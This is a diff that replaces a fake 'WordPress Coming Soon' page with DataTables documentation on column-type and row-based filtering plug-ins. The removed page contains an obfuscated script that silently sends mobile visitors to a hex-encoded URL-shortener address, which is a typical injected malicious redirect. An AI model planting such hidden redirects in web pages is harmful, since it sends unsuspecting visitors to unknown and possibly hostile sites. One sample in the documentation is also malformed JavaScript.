@@ -1,41 +1,77 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>Coming Soon</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f6fc;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            color: #21759b;
-        }
-        h1 {
-            font-size: 7em;
-            margin: 0;
-        }
-        p {
-            font-size: 1.5em;
-            margin-top: 0.5em;
-        }
-    </style>
-</head>
-<body>
-    <div>
-        <h1>WordPress</h1>
-        <p><b>Coming Soon</b></p>
-    </div>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            if (/Mobi|Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
-            }
-        });
-    </script>
-</body>
-</html>
+
+<h2>Filtering plug-in functions</h2>
+
+<p>The filtering plug-in options that DataTables provides are remarkably powerful, and and let you set almost any filtering criterion you wish for user based input. A couple of things to note for filtering, firstly you will likely need to customise the filtering presented on this page to match your specific needs. Secondly, if you are using server-side processing, DataTables doesn't do any client-side filtering, so these plug-ins will not have any effect (with server-side processing, all data manipulation is done by the server - so you would need to implement these filters there).</p>
+
+<p>DataTables supports two different kinds of plug-in filtering methods:</p>
+
+<ul>
+	<li>Type based column filtering - filtering based on the sType of the column.
+		<ul style="font-size:1em;">
+			<li><a href="#how_to_type_based">How to use DataTables plug-in column type based filtering</a></li>
+			<li><a href="#functions_type_based">Plug-in column type based filtering</a></li>
+		</ul>
+	</li>
+	<li>Row based filtering - filtering applied to the data from the whole row.
+		<ul style="font-size:1em;">
+			<li><a href="#how_to">How to use DataTables plug-in row filtering functions</a></li>
+			<li><a href="#functions">Plug-in row filtering functions</a></li>
+		</ul>
+	</li>
+</ul>
+
+
+<a name="how_to"></a>
+<h3>How to use DataTables plug-in column type based filtering</h3>
+
+<p>To make use of the column (type) based filtering plug-in functions below, you need to include it in the Javascript available for your page, after you load the DataTables library, but before you initialise the DataTable. You must also set the column type for the column(s) that you wish to apply the filter to using <a href="/usage/columns#sType">sType</a>.</p>
+
+<pre class="brush: html">&lt;script type="text/javascript" src="jquery.dataTables.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="dataTables.htmlColumnFilter.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+	$(document).ready(function() {
+		var oTable = $('#example').dataTable({
+			"aoColumns": [
+				"sType": "html",
+				null
+			]
+		});
+	} );
+&lt;/script&gt;
+</pre>
+				
+				
+<a name="functions"></a>
+<h3>Plug-in column type filtering functions</h3>
+
+include(`build.1.inc')
+
+
+
+<a name="how_to"></a>
+<h3>How to use DataTables plug-in row filtering functions</h3>
+
+<p>To add the functionality provided by the filtering functions below, you simply need to include it in the Javascript available for your page, after you load the DataTables library, but before you initialise the DataTable. These filters are global and will be applied whenever DataTables applies it's own filtering (for details please see the <a href="/development/filtering#global_filters">filters development page</a>).</p>
+
+<p>In the following example the <a href="#range_numbers">range filtering (numbers)</a> plug-in is saved to a file, and used in the DataTable which is initialised. Note also that event listeners are applied to the two inputs, which will cause the table to redraw, and thus filter the new data (<a href="/examples/plug-ins/range_filtering.html">live example</a>):</p>
+
+<pre class="brush: html">&lt;script type="text/javascript" src="jquery.dataTables.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="dataTables.rangeFilter.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+	$(document).ready(function() {
+		var oTable = $('#example').dataTable();
+		
+		/* Add event listeners to the two range filtering inputs */
+		$('#min').keyup( function() { oTable.fnDraw(); } );
+		$('#max').keyup( function() { oTable.fnDraw(); } );
+	} );
+&lt;/script&gt;
+</pre>
+
+				
+<a name="functions"></a>
+<h3>Plug-in row filtering functions</h3>
+
+
+include(`build.2.inc')
+
